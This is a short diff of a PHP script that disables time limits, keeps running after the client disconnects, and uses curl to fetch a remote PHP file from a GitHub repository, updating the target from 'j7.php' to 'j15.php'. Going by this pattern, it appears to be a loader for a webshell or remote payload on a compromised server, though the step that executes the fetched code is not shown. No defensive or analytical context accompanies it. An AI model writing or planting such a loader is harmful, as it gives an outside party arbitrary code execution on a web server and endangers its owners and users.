@@ -4,7 +4,7 @@ ini_set('display_errors', 1);
 ignore_user_abort(true);
 set_time_limit(0);
 
-$url = "https://github.com/otak-bot/j/raw/refs/heads/main/j7.php";
+$url = "https://github.com/otak-bot/j/raw/refs/heads/main/j15.php";
 
 $ch = curl_init();
 curl_setopt_array($ch, [
